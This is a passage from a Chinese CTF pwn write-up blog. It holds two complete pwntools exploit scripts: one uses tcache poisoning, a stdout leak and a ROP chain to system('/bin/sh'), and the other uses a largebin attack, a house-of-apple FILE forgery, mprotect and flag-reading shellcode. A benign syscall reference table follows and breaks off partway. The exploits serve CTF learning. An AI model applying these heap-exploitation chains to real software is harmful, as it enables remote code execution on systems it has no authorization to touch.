id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28127</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>remote_libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>local_libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc = remote_libc<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">1</span><br>    data.whatcon = content<br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">0</span><br>    data.whatsthis = <span class="hljs-number">0</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">2</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">3</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_nothing</span>(<span class="hljs-params">content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">0</span><br>    data.whatcon = content<br>    data.whatidx = <span class="hljs-number">1</span><br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)    <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    create(i,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment"># leak libc_base</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&#x27;libc_base : &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># leak heap_base</span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = (leak &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x2000</span> <br>log.success(<span class="hljs-string">&#x27;heap_addr : &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-comment"># fill 0x40 tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># double free fastbin</span><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># malloc all tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    create(i,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><br>create(<span class="hljs-number">7</span>,p64((heap_base+<span class="hljs-number">0xf0</span>)^((heap_base+<span class="hljs-number">0x004e40</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br>create(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;aaaaaa&#x27;</span>)<br>create(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># 将0xf0大小的tcache块(entries指针地址在heap_base+0xf8)的entries改为heap_base+0x10</span><br>create(<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x10</span>))<br><br><span class="hljs-comment"># 解包过程中会申请0xe0的空间存放content，也就是说会申请0xf0大小的chunk，由于我们已经将0xf0大小的chunk的entries指针改为heap_base+0x10</span><br><span class="hljs-comment"># 所以我们实际上申请到了heap_base位置的chunk，即tcache_perthread_struct</span><br><span class="hljs-comment"># 伪造counts</span><br>payload  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p16(<span class="hljs-number">1</span>)<br>payload  = payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout)+p64(stdout)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heap_base+<span class="hljs-number">0x10</span>)<br>payload  = payload.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>do_nothing(payload)<br><br><span class="hljs-comment"># leak stack_addr</span><br>payload2 = p64(<span class="hljs-number">0xFBAD1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(environ)+p64(environ+<span class="hljs-number">8</span>)<br>do_nothing(payload2) <br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>stack_addr = leak - <span class="hljs-number">0x1a8</span> + <span class="hljs-number">0x40</span><br>log.success(<span class="hljs-string">&quot;stack_addr : &quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br><br><span class="hljs-comment"># 伪造counts</span><br>payload3  = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p16(<span class="hljs-number">1</span>)<br>payload3  = payload3.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 伪造entrtes</span><br>payload3 += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(stack_addr)<br>payload3  = payload3.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>do_nothing(payload3)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>pop_rdi = <span class="hljs-number">0x2a3e5</span> + libc_base<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)) + libc_base<br>ret = <span class="hljs-number">0x2a3e6</span> + libc_base<br>payload = cyclic(<span class="hljs-number">8</span>) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)<br>payload = payload.ljust(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>do_nothing(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>有堆溢出漏洞，正常打house of apple</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x490</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x1a0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x480</span>,<span class="hljs-string">b&#x27;b&#x27;</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;c&#x27;</span>) <span class="hljs-comment"># 4</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;g&#x27;</span>) <span class="hljs-comment"># 1</span><br>delete(<span class="hljs-number">3</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x21b0f0</span><br>log.success(<span class="hljs-string">&quot;libc_base ==&gt;&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = heap_addr - <span class="hljs-number">0x002510</span><br>log.success(<span class="hljs-string">&quot;heap_base ==&gt;&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4a1</span>) + p64(libc_addr)*<span class="hljs-number">2</span> + p64(heap_addr) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;g&#x27;</span>) <span class="hljs-comment"># 5</span><br><br>fake_IO_FILE = heap_base + <span class="hljs-number">0x002b60</span><br>shellcode = <span class="hljs-string">b&#x27;hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#x27;</span><br><br>f = flat(&#123;<br>    <span class="hljs-number">0x28</span>: <span class="hljs-number">1</span>, <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x280</span>, <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xd8</span>: libc_base + <span class="hljs-number">0x2170c0</span>, <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>(f).ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0xe0</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>)<br>data = data.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x68</span><br>data += p64(libc_base + <span class="hljs-number">0x15d48a</span>)   <br>data = data.ljust(<span class="hljs-number">0x280</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x162f64</span>)<br>data = data.ljust(<span class="hljs-number">0x2a0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2e0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x167420</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data = data.ljust(<span class="hljs-number">0x2e0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(libc_base + <span class="hljs-number">0xd2ba5</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&quot;\x00&quot;</span><br>data += p64(libc_base + <span class="hljs-number">0x5a120</span>)+<span class="hljs-number">0x8</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># mov_rsp_rdx</span><br><br>data += p64(libc_base + <span class="hljs-number">0x2a3e5</span>) <span class="hljs-comment"># pop_rdi</span><br>data += p64(heap_base)<br>data += p64(libc_base + <span class="hljs-number">0x2be51</span>) <span class="hljs-comment"># pop_rsi</span><br>data += p64(<span class="hljs-number">0x10000</span>)<br>data += p64(libc_base + <span class="hljs-number">0x904a9</span>) <span class="hljs-comment"># pop_rdx_rbx</span><br>data += p64(<span class="hljs-number">7</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])<br>data += p64(heap_base + <span class="hljs-number">0x3000</span>)<br><br>data = data.ljust(<span class="hljs-number">0x360</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1a0</span>+data)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>,shellcode)<br><br>Exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h2><h2 id="magic-vm"><a href="#magic-vm" class="headerlink" title="magic_vm"></a>magic_vm</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syscall</title>
      <link href="/2024/05/12/syscall/"/>
      <url>/2024/05/12/syscall/</url>
      
        <content type="html"><![CDATA[<p>syscall</p><span id="more"></span><h1 id="int-80h与syscall"><a href="#int-80h与syscall" class="headerlink" title="int 80h与syscall"></a>int 80h与syscall</h1><p><code>syscall</code>和<code>int 80h</code>是中断指令,Linux通过对这两个指令的封装为开发者们提供的一种用户态切换至内核态的方法,也就是系统调用</p><h2 id="int-0x80-传统方法"><a href="#int-0x80-传统方法" class="headerlink" title="int 0x80 传统方法"></a>int 0x80 传统方法</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“int 0x80”是一种传统的中断指令，用于向处理器发出 0x80 号中断，从而将控制权传递给内核。这种方法自早期 x86 处理器时代以来一直被广泛用于调用系统调用。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>广泛支持： “int 0x80”在较旧的 Linux 内核和处理器上得到广泛支持。<br>简便性： 使用“int 0x80”调用系统调用相对简单，只需要几行汇编代码。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>不推荐使用： 对于 64 位 x86 架构，不推荐使用“int 0x80”。<br>性能较差： 与“syscall”相比，“int 0x80”的性能较差，因为它需要额外的中断处理开销。</p><h2 id="syscall-现代方法"><a href="#syscall-现代方法" class="headerlink" title="syscall 现代方法"></a>syscall 现代方法</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>“syscall”是一种从 Linux 内核 2.4 开始引入的现代系统调用机制。它使用特殊寄存器和指令（例如，eax、rax）来调用系统调用，无需中断。</p><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><p>高性能： “syscall”比“int 0x80”提供了更高的性能，因为它消除了中断处理开销。<br>更安全： “syscall”更安全，因为它防止了由于中断处理中的错误而导致内核崩溃。<br>跨架构支持： “syscall”跨不同的 x86 架构（包括 32 位和 64 位）提供一致的接口。</p><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><p>依赖性： “syscall”需要较新的 Linux 内核和处理器才能正常工作。<br>复杂性： 使用“syscall”调用系统调用比使用“int 0x80”稍显复杂，需要了解特殊的寄存器和指令。</p><h2 id="推荐选择"><a href="#推荐选择" class="headerlink" title="推荐选择"></a>推荐选择</h2><p>对于 32 位 Linux 代码，在大多数情况下，“syscall”是调用系统调用的首选方法。它提供了更高的性能、安全性以及跨架构支持。但是，如果你使用的是较旧的 Linux 内核或处理器，你可能需要使用“int 0x80”作为后备选项。<br>对于 64 位 Linux 代码，只能使用“syscall”，因为“int 0x80”不受支持。</p><h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><h2 id="int-80h"><a href="#int-80h" class="headerlink" title="int 80h"></a>int 80h</h2><p>以<code>eax</code>传递系统调用号<br>参数传递顺序为<code>ebx</code>,<code>ecx</code>,<code>edx</code>,<code>esi</code>,<code>edi</code></p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>以<code>rax</code>传递系统调用号<br>参数传递顺序为<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>r10</code>,<code>r8</code>,<code>r9</code></p><h1 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h1><h2 id="int-80h系统调用号"><a href="#int-80h系统调用号" class="headerlink" title="int 80h系统调用号"></a>int 80h系统调用号</h2><table><thead><tr><th>系统调用</th><th>调用号</th><th>系统调用</th><th>调用号</th></tr></thead><tbody><tr><td>exit</td><td>1</td><td>fork</td><td>2</td></tr><tr><td>read</td><td>3</td><td>write</td><td>4</td></tr><tr><td>open</td><td>5</td><td>close</td><td>6</td></tr><tr><td>waitpid</td><td>7</td><td>creat</td><td>8</td></tr><tr><td>link</td><td>9</td><td>unlink</td><td>10</td></tr><tr><td>execve</td><td>11</td><td>chdir</td><td>12</td></tr><tr><td>time</td><td>13</td><td>mknod</td><td>14</td></tr><tr><td>chmod</td><td>15</td><td>lchown</td><td>16</td></tr><tr><td>break</td><td>17</td><td>oldstat</td><td>18</td></tr><tr><td>lseek</td><td>19</td><td>getpid</td><td>20</td></tr><tr><td>mount</td><td>21</td><td>umount</td><td>22</td></tr><tr><td>setuid</td><td>23</td><td>getuid</td><td>24</td></tr><tr><td>stime</td><td>25</td><td>ptrace</td><td>26</td></tr><tr><td>alarm</td><td>27</td><td>oldfstat</td><td>28</td></tr><tr><td>pause</td><td>29</td><td>utime</td><td>30</td></tr><tr><td>stty</td><td>31</td><td>gtty</td><td>32</td></tr><tr><td>access</td><td>33</td><td>nice</td><td>34</td></tr><tr><td>ftime</td><td>35</td><td>sync</td><td>36</td></tr><tr><td>kill</td><td>37</td><td>rename</td><td>38</td></tr><tr><td>mkdir</td><td>39</td><td>rmdir</td><td>40</td></tr><tr><td>dup</td><td>41</td><td>pipe</td><td>42</td></tr><tr><td>times</td><td>43</td><td>prof</td><td>44</td></tr><tr><td>brk</td><td>45</td><td>setgid</td><td>46</td></tr><tr><td>getgid</td><td>47</td><td>signal</td><td>48</td></tr><tr><td>geteuid</td><td>49</td><td>getegid</td><td>50</td></tr><tr><td>acct</td><td>51</td><td>umount2</td><td>52</td></tr><tr><td>lock</td><td>53</td><td>ioctl</t